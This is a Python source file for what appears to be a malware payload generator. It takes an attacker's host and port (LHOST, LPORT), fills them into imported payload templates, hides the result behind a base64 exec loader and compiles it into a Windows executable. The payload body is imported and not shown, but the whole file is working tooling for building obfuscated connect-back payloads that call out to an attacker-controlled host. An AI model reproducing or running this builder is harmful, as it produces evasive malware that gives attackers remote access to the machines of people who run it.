import argparse
import base64
import time
from tools.payload_template.payload import payload_split_1, payload_split_3
from tools.conversion.pytoexe import convert_to_exe

# Prepare the cmd parser for CLI
def set_cmd_parser() -> argparse.ArgumentParser:
    parser: argparse.ArgumentParser = argparse.ArgumentParser()
    parser.add_argument('LHOST', type=str, help="REQUIRED : The IP address/location that you want the generated payload to connect to")
    parser.add_argument('LPORT', type=int, help="REQUIRED : The PORT that you want the generated payload to connect to")
    return parser



def main() -> None:
    PARSER: argparse.ArgumentParser = set_cmd_parser()
    PARSER_RESULTS: argparse.Namespace = PARSER.parse_args()

    LHOST: str = PARSER_RESULTS.LHOST
    LPORT: int = PARSER_RESULTS.LPORT

    # convert second split of payload to string
    payload_split_2: str = f"""E={LPORT}\nK='{LHOST}'"""
    
    # combine all payload splits
    full_payload: str = payload_split_1 + payload_split_2 + payload_split_3
    
    # encode payload to base64
    encoded_payload: bytes = base64.b64encode(full_payload.encode("utf-8"))

    # write the whole payload to payload.py
    script: str = f"""import base64\nexec(base64.b64decode("{encoded_payload.decode("utf-8")}"))"""
    new_payload = open("output\source\payload.py", "w")
    new_payload.write(script)
    new_payload.close()

    # convert payload.py to exe
    convert_to_exe()
    time.sleep(2)

    # Display folders in which the output source code and exe are found in
    print("\n" * 5)
    print("[LOCATION] generated executable payload.exe is in output/executable\n")
    print("[LOCATION] generated source code payload.py is in output/source/")
    

if __name__ == "__main__":
    main()
